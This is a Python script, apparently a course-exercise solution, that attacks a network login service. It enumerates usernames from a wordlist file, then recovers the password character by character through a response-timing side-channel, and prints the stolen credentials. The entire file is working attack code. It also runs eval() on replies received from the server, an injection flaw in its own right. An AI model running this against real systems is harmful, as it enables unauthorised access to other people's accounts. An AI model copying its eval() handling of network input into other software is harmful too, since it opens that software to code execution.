# write your code here
import datetime
import socket
import json
import sys
import time


CHARACTERS = "abcdefghijklmnopqrstuvwxyz1234567890"


class timeDelay:
    def __init__(self):
        self.start: datetime.datetime
        self.end: datetime.datetime
        self.difference: datetime.timedelta

    def __enter__(self):
        self.start = datetime.datetime.now()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.end = datetime.datetime.now()
        self.difference = round(float(f"{self.end.second}.{self.end.microsecond}") -
                    float(f"{self.start.second}.{self.start.microsecond}"), 1)
        return self


def read_login_file() -> str:
    with open('C:\\Users\\tim.pogue\\Downloads\\logins.txt', 'r') as file:
        for line in file:
            yield line.strip('\n')


def generate_login(user: str, verified: str = "") -> dict:
    for letter in CHARACTERS:
        yield {"login": user, "password": ''.join([verified, letter])}
        if letter.isalpha():
            yield {"login": user, "password": ''.join([verified, letter.upper()])}


if __name__ == "__main__":
    hostname, port = sys.argv[1:]
    address = (hostname, int(port))

    server = socket.socket()
    server.connect(address)

    reply = '{"result": "Wrong login!"}'
    username = read_login_file()
    while eval(reply) == {"result": "Wrong login!"}:
        user_name = next(username)
        login_ = {
            "login": user_name.strip(),
            "password": ""
        }

        server.send(json.dumps(login_).encode())
        reply = server.recv(1024).decode("utf-8")

    logins = generate_login(user_name)
    while eval(reply) != {"result": "Connection success!"}:
        login_ = next(logins)

        with timeDelay() as this_time:
            server.send(json.dumps(login_).encode())
            reply = server.recv(1024).decode("utf-8")

        if this_time.difference != 0.0:
            time.sleep(.1)
            logins = generate_login(user_name, login_['password'])

    print(json.dumps(login_))
